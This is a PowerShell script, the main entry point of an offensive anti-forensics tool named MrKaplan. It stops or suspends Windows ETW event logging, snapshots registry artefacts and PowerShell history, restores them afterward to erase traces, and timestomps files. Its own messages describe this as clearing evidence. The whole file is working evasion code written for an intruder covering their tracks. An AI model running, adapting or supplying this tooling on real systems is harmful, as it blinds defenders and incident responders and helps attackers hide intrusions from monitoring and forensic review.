param (
    [Parameter(Mandatory=$true)]
    [String]
    $operation,

    [String]
    $etwBypassMethod,

    [String]
    $stompedFilePath,

    [String[]]
    $users,

    [String[]]
    $exclusions,

    [Switch]
    $runAsUser = $false
)

Import-Module .\Modules\Registry.psm1
Import-Module .\Modules\Files.psm1
Import-Module .\Modules\Eventlogs.psm1
Import-Module .\Modules\Utils.psm1

$rootKeyPath = "HKCU:\Software\MrKaplan"
$PSDefaultParameterValues['*:Encoding'] = 'utf8'
$usage = "`n[*] Possible Usage:`n`n[*] Show help message:`n`t.\MrKaplan.ps1 help`n`n[*] For config creation and start:`n`t.\MrKaplan.ps1 begin`n`t.\MrKaplan.ps1 begin -Users Reddington,Liz`n`t.\MrKaplan.ps1 begin -Users Reddington`n`t.\MrKaplan.ps1 begin -EtwBypassMethod overflow`n`t.\MrKaplan.ps1 begin -RunAsUser`n`t.\MrKaplan.ps1 begin -Exclusions BamKey, OfficeHistory`n`n[*] For cleanup:`n`t.\MrKaplan.ps1 end`n`n[*] To save file's timestamps:`n`t.\MrKaplan.ps1 timestomp -StompedFilePath C:\path\to\file`n`n"

if (Test-Path "banner.txt") {
    $banner = Get-Content -Path "banner.txt" -Raw
    Write-Host $banner
}

function New-Config {
    param (
        [String[]]
        $users,

        [String]
        $etwBypassMethod,

        [String[]]
        $exclusions
    )
    New-PSDrive -PSProvider Registry -Name HKU -Root HKEY_USERS
    
    if (Test-Path $rootKeyPath) {
        Write-Host "[-] Config already exists, please delete the current and rerun." -ForegroundColor Red
        return $false
    }
    New-Item -Path $rootKeyPath
    New-Item -Path $rootKeyPath -Name "Users"

    if (-not $exclusions) {
        $exclusions = @()
    }

    # Stopping the event logging.
    if (-not $runAsUser) {
        New-ItemProperty -Path $rootKeyPath -Name "RunAsUser" -PropertyType "DWord" -Value $false

        if (-not $exclusions.Contains("eventlogs")) {
            Write-Host "[*] Stopping event logging..." -ForegroundColor Blue

            if ($etwBypassMethod -eq "overflow") {
                Write-Host "[*] This method won't allow any regular user to log in until you end MrKaplan." -ForegroundColor Yellow

                if ($(Read-Host "Are you sure? [y/n]") -eq "y") {
                    $etwMetadata = Get-EventLogsSettings

                    if ($etwMetadata.Count -eq 0) {
                        return $false
                    }
                    
                    if (!$(Clear-EventLogging)) {
                        return $false
                    }

                    New-Item -Path $rootKeyPath -Name "EventLogSettings"
                    foreach ($setting in $etwMetadata.GetEnumerator()) {
                        New-ItemProperty -Path "$($rootKeyPath)\EventLogSettings" -Name $setting.Name -Value $setting.Value
                    }
                }
                else {
                    Write-Host "[-] Exiting..." -ForegroundColor Red
                    return $false
                }
            }
            elseif ($etwBypassMethod -eq "suspend" -or $etwBypassMethod -eq "") {
                $etwMetadata = Invoke-SuspendEtw

                if ($etwMetadata.Count -eq 0) {
                    return $false
                }
                
                New-Item -Path $rootKeyPath -Name "EventLogSettings"
                foreach ($setting in $etwMetadata[1].GetEnumerator()) {
                    New-ItemProperty -Path "$($rootKeyPath)\EventLogSettings" -Name $setting.Name -Value $setting.Value
                }
                
            }
            else {
                Write-Host "[-] Unknown ETW patching method, exiting..." -ForegroundColor Red
                return $false
            }

            Write-Host "[+] Stopped event logging." -ForegroundColor Green
        }
        

        if (-not $exclusions.Contains("appcompatcache")) {
            Copy-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" -Destination "$($rootKeyPath)\AppCompatCache" -Force -Recurse
        }
    }
    else {
        New-ItemProperty -Path $rootKeyPath -Name "RunAsUser" -Value $true
        
    }

    if ($users) {
        if (!$runAsUser) {
            $users.Add($env:USERNAME)
        }
        else {
            Write-Host "[-] Cannot use both run as user and users!" -ForegroundColor Red
            return $false
        }
    }
    else {
        $users = @($env:USERNAME)
    }
    
    # Saving current time.
    New-ItemProperty -Path $rootKeyPath -Name "Time" -Value $(Get-Date).DateTime

    # Saving user data.
    $comDlg32Path = "SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32"

    foreach ($user in $users) {

        if ($exclusions.Contains("pshistory")) {
            $powershellHistory = ""
        }
        else {
            $powershellHistoryFile = "C:\Users\$($user)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

            if (Test-Path $powershellHistoryFile) {
                $powershellHistory = [Convert]::ToBase64String([IO.File]::ReadAllBytes($powershellHistoryFile))
            }
            else {
                $powershellHistory = ""
            }
        }

        New-Item -Path "$($rootKeyPath)\Users" -Name $user
        New-ItemProperty -Path "$($rootKeyPath)\Users\$($user)" -Name "PSHistory" -Value $powershellHistory

        if (-not $exclusions.Contains("comdlg32")) {
            $sid = $(New-Object System.Security.Principal.NTAccount($user)).Translate([System.Security.Principal.SecurityIdentifier]).Value
            
            if (!(Test-Path "HKU:\$($sid)\$($comDlg32Path)")) {
                continue
            }
            Copy-Item "HKU:\$($sid)\$($comDlg32Path)" -Destination "$($rootKeyPath)\Users\$($user)" -Force -Recurse
        }
    }

    New-ItemProperty -Path $rootKeyPath -Name "Exclusions" -Value $exclusions
      
    return $true
}

function Clear-Evidence {
    $result = $true

    # Parsing the config.
    if (-not (Test-Path $rootKeyPath)) {
        Write-Host "[-] Config doesn't exist" -ForegroundColor Red
        return $false
    }

    # Running the modules on each user.
    Write-Host "[*] Cleaning logs..." -ForegroundColor Blue
    $users = $(Get-ChildItem -Path "$($rootKeyPath)\Users" | Select-Object PSChildName).PSChildName
    $runAsUser =$(Get-ItemProperty -Path $rootKeyPath -Name "RunAsUser").RunAsUser
    $time = $(Get-ItemProperty -Path $rootKeyPath -Name "Time").Time
    $exclusions = $(Get-ItemProperty -Path $rootKeyPath -Name "Exclusions").Exclusions

    # Stomping the files.
    $filesToStomp = @{}

    if (Test-Path "$($rootKeyPath)\StompedFiles") {
        $regFilesToStomp = Get-ItemProperty "$($rootKeyPath)\StompedFiles"
        $regFilesToStomp.PsObject.Properties | 
            ForEach-Object {
                $filesToStomp[$_.Name] = $_.Value
            }
    }
    Invoke-StompFiles $filesToStomp
    
    foreach ($user in $users) {
        $psHistory = $(Get-ItemProperty -Path "$($rootKeyPath)\Users\$($user)" -Name "PSHistory").PSHistory
        if (-not $(Clear-Files $time $psHistory $user $runAsUser $exclusions)) {
            Write-Host "[-] Failed to clean files for $($user)." -ForegroundColor Red
            $result = $false
        }
    }

    if (!$(Clear-Registry $time $users $runAsUser $exclusions $rootKeyPath)) {
        Write-Host "[-] Failed to cleanup the registry." -ForegroundColor Red
        $result = $false
    }

    # Restoring the event logging.
    if (!$runAsUser -and -not $exclusions.Contains("eventlogs")) {
        Write-Host "[*] Restoring event logging..." -ForegroundColor Blue

        if (Test-Path "$($rootKeyPath)\EventLogSettings") {
            $etwMetadata = @{}
            $regEventLog = Get-ItemProperty "$($rootKeyPath)\EventLogSettings"
            $regEventLog.PsObject.Properties | 
                ForEach-Object {
                    $etwMetadata[$_.Name] = $_.Value
                }

            if (!$(Invoke-RestoreEtw $etwMetadata)) {
                Write-Host "[-] Failed to restore the eventlogging." -ForegroundColor Red
                $result = $false
            }
        }
    }
    
    if ($result) {
        Write-Host "[+] Restored! Be careful with your actions now." -ForegroundColor Green
    }
    else {
        Write-Host "[!] Finished with partial restoration." -ForegroundColor Yellow
    }

    return $result
}

if ($operation -eq "begin") {
    for ($i = 0; $i -lt $exclusions.Count; $i++) { 
        $exclusions[$i] = $exclusions[$i].ToLower() 
    }

    if (New-Config $users $etwBypassMethod $exclusions) {
        Write-Host "`n[+] Saved required information!`n[+] You can do your operations." -ForegroundColor Green
    }
    else {
        Write-Host "`n[-] Failed to create config file." -ForegroundColor Red
    }
}

elseif ($operation -eq "end") {
    if (Clear-Evidence) {
        Write-Host "`n[+] All evidences cleared!" -ForegroundColor Green
    }
    else {
        Write-Host "`n[-] Failed to clear all evidences." -ForegroundColor Red
    }
}

elseif ($operation -eq "timestomp") {
    if (Invoke-LogFileToStomp $rootKeyPath $stompedFilePath) {
        Write-Host "`n[+] Saved file's timestamps." -ForegroundColor Green
    }       
    else {
        Write-Host "`n[-] Failed to save timestamps." -ForegroundColor Red
    }
}

elseif ($operation -eq "help") {
    Write-Host $usage -ForegroundColor Blue
}

else {
    Write-Host "`n[!] Invalid Usage!" -ForegroundColor Red
    Write-Host $usage -ForegroundColor Blue
}
